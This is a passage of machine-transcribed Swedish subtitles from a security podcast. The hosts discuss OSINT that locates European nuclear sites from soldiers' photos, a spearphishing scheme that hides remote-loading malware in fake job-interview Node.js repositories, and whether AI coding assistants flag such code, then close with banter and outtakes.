`2009 01:03:04,720 --> 01:03:08,820`
Alltså det är inte alla de amerikanska badgerna som direkt ger känslan av att



`2010 01:03:09,580 --> 01:03:12,660`
Vi går till jobbet och har vi här för good guys



`2011 01:03:12,920 --> 01:03:13,680`
Utan det är typ såhär



`2012 01:03:13,940 --> 01:03:17,780`
Hemska bläckfiskar som håller om jorden och annat



`2013 01:03:18,040 --> 01:03:20,860`
Nej, hemska bläckfiskar



`2014 01:03:21,100 --> 01:03:23,920`
Men på tal om den här artikeln



`2015 01:03:23,920 --> 01:03:25,960`
Så finns det ju faktiskt en



`2016 01:03:26,480 --> 01:03:29,560`
En liknande artikelserie ifrån



`2017 01:03:29,800 --> 01:03:32,880`
Jag tror att det är någon journalist på



`2018 01:03:33,140 --> 01:03:33,900`
Före detta



`2019 01:03:34,160 --> 01:03:34,680`
Wired



`2020 01:03:34,920 --> 01:03:35,440`
Tror jag



`2021 01:03:35,960 --> 01:03:38,760`
Som med hjälp av open source intelligence



`2022 01:03:40,040 --> 01:03:42,360`
Kartlägger på alla nukes som finns i Europa



`2023 01:03:42,860 --> 01:03:44,140`
Vilket han gör



`2024 01:03:44,660 --> 01:03:46,960`
Ganska enkelt ändå, det här är ju inte



`2025 01:03:47,480 --> 01:03:51,560`
Inte samma omfattning i den här finska operationen som hans grej



`2026 01:03:51,820 --> 01:03:53,100`
För då sitter han typ och



`2027 01:03:53,360 --> 01:03:53,880`
Googlar runt den här



`2028 01:03:54,180 --> 01:03:54,680`
Lite grann



`2029 01:03:55,460 --> 01:04:00,320`
Och hittar någon app för cue cards som innehåller svin mycket militära referenser



`2030 01:04:00,840 --> 01:04:01,860`
Och



`2031 01:04:02,360 --> 01:04:06,720`
Om det är typ holländska fraser, jag kommer inte ihåg vad det var nu men det kan vi också länka till



`2032 01:04:08,000 --> 01:04:10,820`
Och det slutar ju med att han kan skrapa massa



`2033 01:04:12,360 --> 01:04:12,860`
Av



`2034 01:04:13,120 --> 01:04:14,140`
Vad säger man



`2035 01:04:15,160 --> 01:04:15,940`
Militärbasis



`2036 01:04:16,200 --> 01:04:22,600`
Vakter och grejer, han kan skrapa deras facebook och hitta massa bilder och sen kan han använda bilderna för att kartlägga vart någonstans i världen det är



`2037 01:04:22,600 --> 01:04:24,140`
Och så är det



`2038 01:04:24,400 --> 01:04:27,460`
Till slut så hittar han en bild där hela pletonen står uppradade



`2039 01:04:27,720 --> 01:04:31,300`
Framför två hangar då, det är i Belgien och Holland, det är någonstans där nere



`2040 01:04:32,080 --> 01:04:35,920`
Står de uppradade framför ett hangar och i mitten ligger den här nuken



`2041 01:04:36,160 --> 01:04:37,700`
Och då använder han Google Maps och kan säga



`2042 01:04:37,960 --> 01:04:38,980`
Där togs kortet



`2043 01:04:39,240 --> 01:04:40,520`
Rätt sjukt ändå



`2044 01:04:40,780 --> 01:04:44,880`
Och om han kan så kan ju liksom folk, de här finnarna har ju redan hittat det



`2045 01:04:45,120 --> 01:04:47,680`
Tänker jag, men det här tycker jag är kul för det är verkligen



`2046 01:04:47,940 --> 01:04:49,480`
Någonting så oskyldigt



`2047 01:04:49,740 --> 01:04:50,760`
Innehåller så mycket



`2048 01:04:51,280 --> 01:04:52,560`
Och givet att man är bra på att lägga på det



`2049 01:04:52,860 --> 01:04:53,120`
Pussel



`2050 01:04:53,360 --> 01:04:56,180`
Så kommer man nog med ganska hög sannolikhet fram till ganska sjuka grejer



`2051 01:04:56,440 --> 01:04:58,480`
Tänker jag att det är en ganska bra lärdom i



`2052 01:04:58,740 --> 01:04:59,760`
Att



`2053 01:05:00,280 --> 01:05:05,400`
Till synes okänslig information i tillräckligt stor mängd kan bli jädrigt känslig



`2054 01:05:05,660 --> 01:05:06,160`
Exakt



`2055 01:05:06,420 --> 01:05:09,760`
Och dessutom hur sjukt svårt det är att hålla saker hemligt



`2056 01:05:10,000 --> 01:05:10,520`
Alltså



`2057 01:05:11,040 --> 01:05:14,100`
Konspirationsteori som att vi inte har landat på månen och sådana grejer liksom



`2058 01:05:14,360 --> 01:05:17,180`
Hur i helvete skulle det hålla ett samhälle så här länge



`2059 01:05:17,440 --> 01:05:19,480`
In fucking possible



`2060 01:05:20,240 --> 01:05:21,280`
Ja men det är roligt



`2061 01:05:21,280 --> 01:05:22,300`
Två personer kan ha det här



`2062 01:05:22,600 --> 01:05:24,140`
De kan hålla en hemlighet ifall en av dem är död



`2063 01:05:27,460 --> 01:05:30,020`
Det är därför Johan inte har så många vänner



`2064 01:05:30,280 --> 01:05:31,300`
Och med många hemligheter



`2065 01:05:31,560 --> 01:05:33,360`
Eller tvärtom



`2066 01:05:33,600 --> 01:05:38,220`
Det var en utvecklare som hamnade på en teknisk jobbintervju remote



`2067 01:05:39,240 --> 01:05:44,360`
Han fick en Node.js-kodbas som han skulle göra lite uppgifter i



`2068 01:05:47,440 --> 01:05:51,020`
Han körde den här Claude heter den va



`2069 01:05:51,780 --> 01:05:52,560`
Och Claude



`2070 01:05:52,860 --> 01:05:54,400`
Såhär



`2071 01:05:56,440 --> 01:05:57,720`
Det här verkar hemskt



`2072 01:05:57,980 --> 01:06:02,080`
Ska du inte kolla att det inte finns någonting som försöker



`2073 01:06:02,320 --> 01:06:04,640`
Skäla grejer från det och så är den här kodbasen



`2074 01:06:05,400 --> 01:06:07,440`
Så började han luska igenom



`2075 01:06:08,220 --> 01:06:09,500`
Och så hittade han då att



`2076 01:06:10,260 --> 01:06:13,080`
En url ligger uppfuskedad som en byte array



`2077 01:06:13,340 --> 01:06:15,640`
Och den urlen laddas



`2078 01:06:16,660 --> 01:06:22,560`
Och den urlen görs om till en javascript funktion och så exekveras javascript-funktionen



`2079 01:06:22,860 --> 01:06:27,460`
Så folk som vill



`2080 01:06:27,980 --> 01:06:29,520`
Infektera



`2081 01:06:30,020 --> 01:06:32,580`
De pinpointar intressanta utvecklare



`2082 01:06:34,380 --> 01:06:40,000`
Och ber dem gå till Github-projektet och köra dem och så ligger det malware



`2083 01:06:40,520 --> 01:06:42,320`
Som då körs in direkt från det



`2084 01:06:43,340 --> 01:06:44,360`
Bra, tack\!



`2085 01:06:44,620 --> 01:06:46,920`
Det är intressant att



`2086 01:06:47,680 --> 01:06:50,500`
Att det är värt för hotaktörer att



`2087 01:06:50,760 --> 01:06:52,300`
Liksom gå punktvis på



`2088 01:06:52,600 --> 01:06:54,400`
Specifika utvecklare



`2089 01:06:55,420 --> 01:06:57,460`
Det är liksom inte en



`2090 01:06:58,240 --> 01:07:00,540`
Vi vet ju inte om det har någon koppling till den här Shia Hulu



`2091 01:07:00,800 --> 01:07:02,580`
Eller liksom



`2092 01:07:03,600 --> 01:07:06,160`
Men tydligen så hotaktörer de liksom



`2093 01:07:06,420 --> 01:07:08,220`
Spearfishar utvecklare till



`2094 01:07:08,480 --> 01:07:09,240`
Onskefulla



`2095 01:07:09,500 --> 01:07:11,800`
Vi har ju snackat om det jättemycket i den här podcasten



`2096 01:07:12,060 --> 01:07:12,820`
Historiskt också



`2097 01:07:13,080 --> 01:07:14,360`
Identitet är det nya svarta



`2098 01:07:14,620 --> 01:07:15,380`
Det är det man vill ha



`2099 01:07:15,640 --> 01:07:17,680`
För att den anomalida detektionen är noll



`2100 01:07:17,940 --> 01:07:18,720`
Särskilt då när vi har



`2101 01:07:19,480 --> 01:07:20,240`
De



`2102 01:07:20,760 --> 01:07:22,300`
Det sättet att utveckla på den typen



`2103 01:07:22,300 --> 01:07:23,320`
Av infrastruktur



`2104 01:07:23,580 --> 01:07:24,340`
Hur vi nu



`2105 01:07:24,600 --> 01:07:25,880`
Modernt utvecklar kod



`2106 01:07:26,140 --> 01:07:27,680`
Så är det guld att hitta en identitet



`2107 01:07:27,940 --> 01:07:32,280`
Och väljer du några mål via LinkedIn så kan du



`2108 01:07:32,800 --> 01:07:33,300`
Ganska snabbt



`2109 01:07:33,560 --> 01:07:38,680`
Du kan ju antingen söka på specifika intressanta arbetsföräldrar



`2110 01:07:39,960 --> 01:07:41,760`
Nuvarande arbetsgivare och så



`2111 01:07:42,520 --> 01:07:44,580`
Det mesta i den här storyn för mig är trovärdigt



`2112 01:07:45,080 --> 01:07:46,880`
Förutom den biten med Claude



`2113 01:07:47,640 --> 01:07:49,440`
Jag har använt Claude så sent som idag



`2114 01:07:49,940 --> 01:07:51,480`
Det är en fucking idiot



`2115 01:07:52,300 --> 01:07:53,060`
Att den skulle



`2116 01:07:53,320 --> 01:07:54,100`
Utan att du



`2117 01:07:54,340 --> 01:07:55,380`
Tydligt instruerar den



`2118 01:07:55,620 --> 01:07:57,420`
Det är en validerande Mattias nu



`2119 01:07:57,680 --> 01:07:58,440`
Då säger jag såhär



`2120 01:07:58,700 --> 01:07:59,460`
Jag har använt Claude



`2121 01:07:59,720 --> 01:08:03,300`
Så mycket att jag köpt ett Claude Max konto för 2000 i månaden



`2122 01:08:04,080 --> 01:08:04,840`
Bra skit



`2123 01:08:05,100 --> 01:08:07,400`
Det har ökat min produktivitet säkert 100%



`2124 01:08:07,660 --> 01:08:09,200`
Men erkänn då att



`2125 01:08:09,460 --> 01:08:10,220`
För att det ska bli bra



`2126 01:08:10,740 --> 01:08:11,760`
Så får du styra den här tårt



`2127 01:08:12,020 --> 01:08:13,540`
Du måste veta vad du pratar om



`2128 01:08:13,800 --> 01:08:16,360`
Men det är en jävligt bra slav alltså



`2129 01:08:16,620 --> 01:08:17,900`
Så att den automagiskt skulle bara säga



`2130 01:08:18,160 --> 01:08:20,200`
By the way det här skulle kunna vara något läskigt



`2131 01:08:20,720 --> 01:08:21,220`
Fuck no



`2132 01:08:21,480 --> 01:08:22,260`
Då får du säga den såhär



`2133 01:08:22,560 --> 01:08:23,580`
Jag vill att du



`2134 01:08:23,840 --> 01:08:25,620`
Du får fan inte exekvera den



`2135 01:08:25,880 --> 01:08:26,400`
Jag vill att du



`2136 01:08:26,660 --> 01:08:29,460`
Noga går igenom den här kodbasen och letar efter någon som skulle kunna ha den



`2137 01:08:29,720 --> 01:08:33,560`
Man kanske hade förpromptat den att kolla alltid efter säkerhetsgrejer i projektet



`2138 01:08:33,820 --> 01:08:37,140`
Men det är en hel vetenskap att få den



`2139 01:08:37,400 --> 01:08:38,680`
Jag har ju färdiga



`2140 01:08:39,200 --> 01:08:40,480`
Kontextfiler



`2141 01:08:40,740 --> 01:08:42,020`
Som jag använder hela tiden



`2142 01:08:42,520 --> 01:08:45,080`
Så den glömmer av var tionde minut



`2143 01:08:45,340 --> 01:08:46,620`
Det är bara för att du är fattig



`2144 01:08:48,160 --> 01:08:49,440`
Så kan det i sig vara



`2145 01:08:49,700 --> 01:08:52,000`
Har man ett bra abonnemang så är den ganska bra men de har ju faktiskt



`2146 01:08:52,300 --> 01:08:53,060`
Det sjuka är att



`2147 01:08:53,580 --> 01:08:55,120`
Jag fick bara njuta av det här i typ



`2148 01:08:55,620 --> 01:08:56,400`
2-3 veckor



`2149 01:08:56,900 --> 01:08:58,960`
Där den liksom



`2150 01:08:59,220 --> 01:09:00,240`
Det glödde verkligen



`2151 01:09:00,500 --> 01:09:02,800`
Jag har aldrig kunnat koda så mycket i hela mitt liv



`2152 01:09:03,060 --> 01:09:04,580`
Jag är inte så bra på att koda det ska jag säga också



`2153 01:09:04,840 --> 01:09:06,380`
Men den här jäveln



`2154 01:09:06,640 --> 01:09:07,140`
Wow



`2155 01:09:07,400 --> 01:09:08,940`
Men sen så var det lite för bra för att vara sant



`2156 01:09:09,200 --> 01:09:12,020`
Så de limiterar ju tokens då



`2157 01:09:12,260 --> 01:09:13,300`
Den kunde jobba dygnet runt



`2158 01:09:13,540 --> 01:09:15,080`
Den kunde jobba parallellt dygnet runt



`2159 01:09:15,340 --> 01:09:17,640`
Men jag pastade in



`2160 01:09:17,900 --> 01:09:22,260`
Nu har inte jag klord men jag testade att pastade in relevant kod in i



`2161 01:09:22,820 --> 01:09:24,340`
Gemini



`2162 01:09:24,600 --> 01:09:24,860`
Och



`2163 01:09:25,120 --> 01:09:26,660`
Vilken är det, är det Googles?



`2164 01:09:26,900 --> 01:09:27,420`
Det är Googles



`2165 01:09:27,680 --> 01:09:29,220`
Och så bad jag den



`2166 01:09:29,720 --> 01:09:31,520`
Jag tror min prompt var typ



`2167 01:09:31,780 --> 01:09:34,840`
Please look at this code



`2168 01:09:35,100 --> 01:09:36,640`
And explain it in detail eller någonting



`2169 01:09:36,900 --> 01:09:38,680`
Jag bad den titta på koden



`2170 01:09:39,200 --> 01:09:42,260`
Jag gav inga hints i prompten om att det fanns säkerhetshål



`2171 01:09:42,780 --> 01:09:43,800`
Och den kom ut



`2172 01:09:44,060 --> 01:09:48,420`
Den började med en varning sen kom en detaljerad beskrivning



`2173 01:09:49,180 --> 01:09:52,260`
Och det sista sen kommer en stor jättevarning om



`2174 01:09:52,520 --> 01:09:53,020`
Om att



`2175 01:09:54,060 --> 01:09:54,560`
Det här



`2176 01:09:54,820 --> 01:09:59,940`
Så jag antar att de är tränade på att det här är ett malware-pattern



`2177 01:10:00,700 --> 01:10:02,240`
För Gemini



`2178 01:10:05,820 --> 01:10:07,100`
Men jag måste ju säga det att



`2179 01:10:07,620 --> 01:10:13,260`
Det Mattias är inne på är att den är ganska dum, ja för du måste också kunna ställa rätt fråga också



`2180 01:10:13,760 --> 01:10:18,120`
Så jag har ju en pre-prompt fil som säger hur jag vill att den ska svara



`2181 01:10:18,620 --> 01:10:22,220`
Du ska anta att den som tar emot ditt medlande är den här



`2182 01:10:22,780 --> 01:10:24,820`
Security Researcher



`2183 01:10:25,080 --> 01:10:26,100`
Jag vill ha alla typ



`2184 01:10:26,360 --> 01:10:28,140`
Jag vill ha testfall för allt du gör



`2185 01:10:28,400 --> 01:10:30,200`
Jag vill att testfallen är konstruerade på det här sättet



`2186 01:10:30,700 --> 01:10:34,300`
Jag vill att du ska inte använda några binärer lokalt



`2187 01:10:34,540 --> 01:10:36,600`
Om du ska använda binärer så måste du



`2188 01:10:36,860 --> 01:10:38,380`
Promta mig om vad det är du vill ha



`2189 01:10:38,640 --> 01:10:40,440`
Så att jag kan köra dem via min MCP



`2190 01:10:40,700 --> 01:10:46,320`
Och MCP i den här fallet låter ju ascoolt men det är egentligen bara du får lov att använda de här binärerna under vissa förutsättningar



`2191 01:10:47,100 --> 01:10:47,600`
Skit i det



`2192 01:10:47,860 --> 01:10:50,940`
Det kan vara curl eller vad fan men nu vill Q-control eller



`2193 01:10:51,180 --> 01:10:52,220`
Men men men



`2194 01:10:52,480 --> 01:10:53,500`
Men då blir det ganska bra alltså



`2195 01:10:53,760 --> 01:10:57,600`
Men den ja den hittar ju på grejer som är helt kokobello för att den inte vet



`2196 01:10:57,860 --> 01:11:01,700`
Den kanske inte har hela kontextet och sen så gissar den typ på det du vill veta



`2197 01:11:02,200 --> 01:11:08,340`
Vi vet ju inte exakt hur hans setup ser ut men han hade ju alltså Claude i en idé



`2198 01:11:08,600 --> 01:11:09,880`
Och vi vet inte hur



`2199 01:11:10,400 --> 01:11:11,940`
Hur bra promptregler



`2200 01:11:12,180 --> 01:11:16,280`
Det är precis så jag kör, Visual Studio Code med Co-pilot med Claude-modellen



`2201 01:11:16,540 --> 01:11:18,080`
Och jag menar återigen styr jag den



`2202 01:11:18,340 --> 01:11:18,840`
Co-pilot har Claude?



`2203 01:11:19,360 --> 01:11:20,900`
Ja du kan välja vilken



`2204 01:11:21,140 --> 01:11:21,660`
Claude-pilot



`2205 01:11:22,220 --> 01:11:25,040`
Den heter ju Co-pilot



`2206 01:11:25,300 --> 01:11:27,340`
Microsoft döper ju allting



`2207 01:11:27,600 --> 01:11:29,900`
Alla LLM är Co-pilot, var du än hittar dem



`2208 01:11:30,420 --> 01:11:33,480`
Och det här är då chatt i



`2209 01:11:33,740 --> 01:11:36,300`
Grejen i Visual Studio Code



`2210 01:11:36,560 --> 01:11:40,660`
Men du kan testa sen för vi har ju relevant



`2211 01:11:40,900 --> 01:11:42,180`
Vi har ju länk till relevant



`2212 01:11:42,440 --> 01:11:45,520`
Liksom hur själva malware



`2213 01:11:45,780 --> 01:11:46,800`
P.S. in och se vad som händer



`2214 01:11:47,300 --> 01:11:47,560`
Ja



`2215 01:11:48,340 --> 01:11:50,640`
För på honom



`2216 01:11:50,900 --> 01:11:51,660`
Jag tror inte



`2217 01:11:51,660 --> 01:11:54,480`
Jag kan inte minnas att han tog upp någonting om att han skulle ha



`2218 01:11:54,980 --> 01:11:58,580`
Några egna specifika varningskonfigurationer



`2219 01:11:58,820 --> 01:11:59,860`
Det lät på honom som att han



`2220 01:12:00,100 --> 01:12:01,640`
För jag tror inte den gör någonting



`2221 01:12:02,160 --> 01:12:02,920`
Om du inte ber han



`2222 01:12:03,940 --> 01:12:10,340`
Nej då är det frågan vad han har för konfil och vad är det för standard promptning i hans miljö



`2223 01:12:10,600 --> 01:12:11,620`
Vet inte



`2224 01:12:13,160 --> 01:12:13,940`
Nåväl



`2225 01:12:15,220 --> 01:12:16,500`
Det om detta kanske



`2226 01:12:17,520 --> 01:12:19,560`
Det var ett trevligt avsnitt men nu är det dags att runda av



`2227 01:12:19,820 --> 01:12:20,580`
Ja det blir inte bättre än såhär



`2228 01:12:20,580 --> 01:12:21,360`
Vi hörs



`2229 01:12:21,660 --> 01:12:25,760`
Igen om två veckor och då ska vi prata hur det går när hela världen trallar samman



`2230 01:12:26,020 --> 01:12:26,520`
När det går



`2231 01:12:26,780 --> 01:12:27,540`
Det går söderut



`2232 01:12:27,800 --> 01:12:28,320`
Ja



`2233 01:12:28,580 --> 01:12:29,080`
Vad sa du?



`2234 01:12:29,340 --> 01:12:30,100`
Va? Okej



`2235 01:12:30,360 --> 01:12:30,880`
Iallafall



`2236 01:12:31,140 --> 01:12:34,200`
Har det gött, jag som pratade efter Johan Ryberg Möller med mig hade jag Peter Magnusson



`2237 01:12:35,220 --> 01:12:36,500`
Funktionen i JavaScript



`2238 01:12:36,760 --> 01:12:37,540`
Rickard Bortfors



`2239 01:12:37,780 --> 01:12:39,060`
Som inte använde Clord



`2240 01:12:39,320 --> 01:12:40,100`
Mattias Idage



`2241 01:12:40,340 --> 01:12:41,120`
Som använder Clord



`2242 01:12:41,380 --> 01:12:41,880`
Och Jesper Clord



`2243 01:12:42,140 --> 01:12:43,160`
Definitivt använder Clord



`2244 01:12:45,980 --> 01:12:47,000`
Hej och välkommen till



`2245 01:12:47,260 --> 01:12:48,280`
Fack



`2246 01:12:50,580 --> 01:12:51,360`
Det här skall aldrig gå



`2247 01:12:51,660 --> 01:12:52,180`
Okej



`2248 01:12:54,220 --> 01:12:56,020`
Hej och välkommen till Säkerhetspodcasten



`2249 01:12:56,260 --> 01:12:57,540`
Jag som pratar inte Johan



`2250 01:12:57,800 --> 01:12:59,340`
Jag kan inte ta med mig det här



`2251 01:13:00,360 --> 01:13:00,880`
Andas



`2252 01:13:02,920 --> 01:13:03,940`
Reboot



`2253 01:13:06,260 --> 01:13:08,560`
Såhär har vi inte varit på några år



`2254 01:13:08,820 --> 01:13:10,100`
Så jävla chipsigt



`2255 01:13:10,340 --> 01:13:11,620`
Det var så jävla tröttat



`2256 01:13:13,160 --> 01:13:14,180`
Bakom kantaren



`2257 01:13:14,440 --> 01:13:15,220`
Jag har redan prövat



`2258 01:13:15,460 --> 01:13:17,000`
Jag var lite besviken


